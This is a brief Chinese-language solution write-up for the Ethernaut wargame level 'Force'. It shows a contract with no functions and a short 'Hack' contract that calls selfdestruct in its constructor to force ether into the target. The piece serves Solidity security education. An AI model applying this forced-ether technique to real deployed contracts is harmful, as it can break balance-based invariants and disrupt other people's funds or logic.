# Ethernaut 07-Force

## 本关目标

- 让 Force 合约的余额大于 0

## 合约分析

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

## 解决方案

1. Force 合约既没有 receive()也没有 fallback(),可以使用 selfdestruct(Force 合约地址)强制向 Force 合约转账

```solidity
contract Hack{
    // 携带一些wei,传入Force实例地址
    constructor(address payable _target) payable{
        selfdestruct(_target);
    }
}
```
